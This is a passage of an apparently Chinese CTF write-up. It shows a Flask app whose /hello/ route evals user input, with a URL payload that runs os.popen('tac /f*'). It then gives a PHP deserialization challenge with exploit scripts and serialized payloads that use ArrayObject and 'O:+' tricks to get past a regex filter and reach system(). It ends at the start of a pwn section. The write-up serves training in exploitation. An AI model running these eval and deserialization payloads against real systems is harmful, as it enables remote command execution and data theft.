+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span><span class=lnt>98
+</span><span class=lnt>99
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># app.py</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>url_for</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>send_file</span><span class=p>,</span> <span class=n>Response</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=s1>&#39;S3cr3tK3y&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;admin&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#39;</span><span class=p>,</span> <span class=s1>&#39;role&#39;</span><span class=p>:</span> <span class=s1>&#39;admin&#39;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=c1># Check if user is loggedin</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;loggedin&#39;</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;profile&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span> <span class=ow>and</span> <span class=s1>&#39;username&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span> <span class=ow>and</span> <span class=s1>&#39;password&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>username</span> <span class=ow>in</span> <span class=n>users</span> <span class=ow>and</span> <span class=n>password</span> <span class=o>==</span> <span class=n>users</span><span class=p>[</span><span class=n>username</span><span class=p>][</span><span class=s1>&#39;password&#39;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>            <span class=n>session</span><span class=p>[</span><span class=s1>&#39;loggedin&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>            <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>username</span>
+</span></span><span class=line><span class=cl>            <span class=n>session</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>users</span><span class=p>[</span><span class=n>username</span><span class=p>][</span><span class=s1>&#39;role&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;profile&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;Incorrect username/password!&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login2.html&#39;</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=n>msg</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span> 
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span> <span class=ow>and</span> <span class=s1>&#39;username&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span> <span class=ow>and</span> <span class=s1>&#39;password&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>username</span> <span class=ow>in</span> <span class=n>users</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;Account already exists!&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>users</span><span class=p>[</span><span class=n>username</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=n>password</span><span class=p>,</span> <span class=s1>&#39;role&#39;</span><span class=p>:</span> <span class=s1>&#39;user&#39;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;You have successfully registered!&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register2.html&#39;</span><span class=p>,</span> <span class=n>msg</span><span class=o>=</span><span class=n>msg</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/profile/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>profile</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;loggedin&#39;</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;profile2.html&#39;</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>],</span> <span class=n>role</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/show/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;loggedin&#39;</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;show2.html&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/download/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>download</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;loggedin&#39;</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>filename</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;filename&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;filename&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=p>:</span>              
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>send_file</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>as_attachment</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/hello/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;eval&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;hello,</span><span class=si>{</span><span class=nb>eval</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;hello&#34;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/logout/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>   <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;loggedin&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;role&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8080</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>审计代码发现一个RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://5d9ac37c-eb1a-465c-b756-266b55182087.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen(&#39;tac /f*&#39;).read()
+</span></span></code></pre></td></tr></table></div></div><h1 id=easy_php>easy_php</h1><p>一眼反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;not allowed!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ctfshow</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;1+1&gt;2&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^[Oa]:[\d]+/i&#34;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>这里的过滤是不允许Oa开头那么试试用+绕过</p><p>EXP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$ctfshow</span><span class=o>=</span><span class=s1>&#39;whoami&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>());</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/O:/&#39;</span><span class=p>,</span> <span class=s1>&#39;O:+&#39;</span><span class=p>,</span> <span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>无回显</p><p>那么再试试把O替换成C来绕过呢</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?1%2b1&gt;2=C:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:6:&#34;whoami&#34;;}
+</span></span></code></pre></td></tr></table></div></div><p>还是没有回显</p><p>那么就要考虑用自带的类了
+查看环境中的内置类</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$classes</span> <span class=o>=</span> <span class=nx>get_declared_classes</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$classes</span> <span class=k>as</span> <span class=nv>$class</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$methods</span> <span class=o>=</span> <span class=nx>get_class_methods</span><span class=p>(</span><span class=nv>$class</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$methods</span> <span class=k>as</span> <span class=nv>$method</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$method</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;unserialize&#39;</span><span class=p>,)))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>print</span> <span class=nv>$class</span> <span class=o>.</span> <span class=s1>&#39;::&#39;</span> <span class=o>.</span> <span class=nv>$method</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>ArrayObject</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>ArrayIterator</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>RecursiveArrayIterator</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>SplDoublyLinkedList</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>SplQueue</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>SplStack</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span><span class=line><span class=cl><span class=nx>SplObjectStorage</span><span class=o>::</span><span class=na>unserialize</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里考虑使用<code>ArrayObject</code></p><p>EXP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$ctfshow</span><span class=o>=</span><span class=s1>&#39;tac /f*&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ArrayObject</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//$a= preg_replace(&#39;/O:/&#39;, &#39;O:+&#39;, $a);
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>上面的这些类只要能打出序列化字符串的都可以用（亲测）</p><p>最后传参即可打通</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url/?1%2b1&gt;2O:11:&#34;ArrayObject&#34;:3:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:1:&#34;a&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:7:&#34;tac /f*&#34;;}}}
+</span></span></code></pre></td></tr></table></div></div><h1 id=easy_class>easy_class</h1><p>一个pwn的溢出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
